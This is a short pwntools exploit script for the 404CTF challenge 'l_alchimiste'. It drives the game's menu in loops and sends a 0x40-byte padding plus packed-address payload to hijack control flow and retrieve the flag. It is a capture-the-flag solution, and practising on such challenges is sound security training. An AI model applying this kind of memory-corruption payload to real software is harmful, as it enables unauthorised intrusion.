from pwn import *
warnings.filterwarnings("ignore", category=BytesWarning)
#io = process("./l_alchimiste")
HOST, PORT = "challenges.404ctf.fr", 30944 
io = remote(HOST, PORT)


def getStrength():
	io.recvuntil(">>> ")
	io.sendline("2")
	io.recvuntil(">>> ")
	io.sendline("1")

def checkStrength():
	io.recvuntil(">>> ")
	io.sendline("4")
	text = io.recvuntil("1:")
	print(text)
	if b"FOR: 160" in text:
		return 1
	else:
		return 0

def setInteligence():
	io.recvuntil(">>> ")
	io.sendline("2")

	io.recvuntil(">>> ")
	io.sendline("3")
	io.recvuntil("[Vous] : ")
	io.sendline(b"a"*0x40+p64(0x004008d5))

	io.recvuntil(">>> ")
	io.sendline("1")

def checkInteligence():
	io.recvuntil(">>> ")
	io.sendline("4")
	text = io.recvuntil("1:")
	print(text)
	if b"INT: 160" in text:
		return 1
	else:
		return 0

io.recvuntil(">>> ")
io.sendline("1")
okStr = 0
while okStr != 1:
	getStrength()
	okStr = checkStrength()

okInt = 0 
while okInt != 1:
	okInt = checkInteligence()
	setInteligence()
io.recvuntil(">>> ")
io.sendline("5")
print(io.recvline().decode())
print(io.recvline().decode())
print("Flag: ", io.recvline().decode())